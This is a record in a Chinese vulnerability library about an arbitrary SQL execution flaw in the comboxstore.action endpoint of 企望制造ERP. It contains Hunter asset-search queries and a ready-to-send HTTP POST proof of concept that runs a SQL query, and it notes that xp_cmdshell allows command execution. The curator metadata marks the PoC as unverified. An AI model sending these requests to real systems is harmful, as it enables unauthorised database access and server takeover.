---
source: "wy876 漏洞文库"
title: "企望制造ERP comboxstore任意SQL执行"
product: "企望制造ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "文称未认证但有JSESSIONID示例"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ry4xq0e8le5qgn5r"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0ERPcomboxstore.action/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0ERPcomboxstore.actionSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"企望制造ERP\""
id: "vw-b8dcc1bb216adfb8a898586a"
entity_id: "ve-b8dcc1bb216adfb8a898586a"
schema_version: "1"
---

# 企望制造ERP comboxstore任意SQL执行

## 条目说明

- 对象与具体问题：企望制造ERP；comboxstore任意SQL执行
- 版本、配置及部署条件：无版本
- 认证与权限前提：文称未认证但有JSESSIONID示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Hunterapp.name误抽fofa且截断
- 完整select版本请求可作为20更低影响证据，但响应缺失
- 接口可达不等漏洞；需要鉴权对照和DB命令权限，不可直接宣RCE

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
企望制造eERP系统由深知纸箱行业特点和业务流程的多位IT专家打造，具有国际先进的管理方式，将现代化的管理方式融入erp软件中，让企业分分钟就拥有科学的管理经验。 erp的功能包括成本核算、报价定价、订单下达、生产下单、现场管理等多种功能。由于企望制造 ERP comboxstore.action接口权限设置不当，默认的配置可执行任意SQL语句，利用xp_cmdshell函数可远程执行命令，未经认证的攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 企望制造ERP系统

## 三、资产测绘
+ hunter`app.name="企望制造ERP"`
+ 登录页面


## 四、漏洞复现
1.访问`poc`出现如下页面表示存在漏洞

```plain
/mainFunctions/comboxstore.action
```


2. 执行SQL语句获取数据库版本

```http
POST /mainFunctions/comboxstore.action HTTP/1.1
Host: xx.xx.xx.xx	
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=7256C68B9C89F11BE2F841C3F1CAA415
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

comboxsql=select%20@@version;
```

> 请求长度说明：原资料 Content-Length 为 29；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ry4xq0e8le5qgn5r>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
